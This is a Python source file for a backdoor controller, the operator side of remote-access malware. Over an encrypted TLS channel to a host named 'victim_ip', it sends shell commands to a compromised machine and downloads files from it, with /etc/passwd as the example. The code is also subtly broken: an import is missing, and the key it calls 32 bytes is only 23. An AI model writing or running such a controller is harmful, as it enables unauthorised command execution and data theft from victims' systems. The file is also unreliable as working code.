

import socket
import ssl
import json
import base64
from Crypto.Cipher import AES

class BackdoorController:
    def __init__(self, host, port, key):
        self.host = host
        self.port = port
        self.key = key
        self.sock = None
        
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock = ssl.wrap_socket(self.sock)
        self.sock.connect((self.host, self.port))
        
    def encrypt(self, data):
        nonce = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_EAX, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        return base64.b64encode(nonce + tag + ciphertext).decode()
        
    def decrypt(self, encrypted_data):
        data = base64.b64decode(encrypted_data.encode())
        nonce = data[:16]
        tag = data[16:32]
        ciphertext = data[32:]
        cipher = AES.new(self.key, AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode()
        
    def send_command(self, command):
        request = {
            "type": "command",
            "command": command
        }
        encrypted_request = self.encrypt(json.dumps(request))
        self.sock.send(encrypted_request.encode())
        
        encrypted_response = self.sock.recv(4096).decode()
        response = json.loads(self.decrypt(encrypted_response))
        return response
        
    def download_file(self, remote_path):
        request = {
            "type": "file_transfer",
            "data": {
                "action": "download",
                "path": remote_path
            }
        }
        encrypted_request = self.encrypt(json.dumps(request))
        self.sock.send(encrypted_request.encode())
        
        encrypted_response = self.sock.recv(4096).decode()
        response = json.loads(self.decrypt(encrypted_response))
        
        if response['status'] == 'success':
            content = base64.b64decode(response['content'])
            return content
        else:
            return None

if __name__ == '__main__':
    key = b'32-byte-key-for-AES-256'
    controller = BackdoorController('victim_ip', 443, key)
    
    try:
        controller.connect()
        
        # Example usage
        print(controller.send_command("whoami"))
        print(controller.send_command("ls -la"))
        
        file_content = controller.download_file("/etc/passwd")
        if file_content:
            with open("passwd.txt", "wb") as f:
                f.write(file_content)
                
    finally:
        controller.sock.close()